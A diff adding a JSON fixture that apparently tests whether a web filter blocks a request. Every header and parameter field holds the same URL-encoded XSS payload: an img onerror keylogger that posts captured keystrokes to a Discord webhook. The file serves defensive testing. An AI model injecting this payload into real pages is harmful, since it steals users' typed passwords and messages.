@@ -1,0 +1,13 @@
+{
+  "req": [
+    {
+      "URL": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+      "ARGS": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+      "BODY": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+      "COOKIE": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+      "USER-AGENT": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+      "REFERER": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+      "BLOCKED": true
+    }
+  ]
+}
